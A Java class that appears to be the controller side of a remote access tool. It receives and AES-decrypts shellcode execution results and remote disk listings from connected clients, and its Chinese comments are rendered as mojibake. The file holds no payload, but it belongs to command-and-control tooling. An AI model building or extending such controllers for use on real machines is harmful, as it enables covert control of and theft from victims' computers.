/**
 * ���ܣ��Ƿ�������ĳ���ͻ��˵�ͨ���߳�
 */
package tools;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

import common.Message;
import common.MessageType;
import encryption.AESEn;
import view.centerUI;

public class OperationClient extends Thread {
	public Socket s;
	private String AESPrivateKey;
	String ip;
	boolean b = true;
	
	public OperationClient(Socket s,String AESPrivateKey) {
		this.s = s;
		this.AESPrivateKey = AESPrivateKey;
		ip = s.getInetAddress().getHostAddress();
	}
	
	public void run() {
		while (b) {
			try {
				ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
				Message message = (Message) ois.readObject();
				if(message.getMesType().equals(MessageType.message_shellcode)) {
					System.out.println("���յ��ͻ��˷���shellcodeִ�н��...");
			        byte[] decrypt = AESEn.decrypt(message.getContent(), AESPrivateKey);
					String result =  new String(decrypt,"utf-8");
					result += "\n==========================================================";
					//System.out.println(result);
					centerUI center = new centerUI();
					center.updateJTextArea(result);
				}else if(message.getMesType().equals(MessageType.message_respondDiskList_fileManager)) {
					String result = new String(message.getContent());
					System.out.println("����˽��յ��ͻ��˷��صĴ���Ŀ¼���:\r\n"+result);
					
				}
				
			} catch (Exception e) {
				System.out.println(ip+"�ͻ��˶Ͽ�����...");
				try {
					b = false;
					s.close();
					ManageClientThread.delClientThread(ip);
					
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
			
		}
	}
}

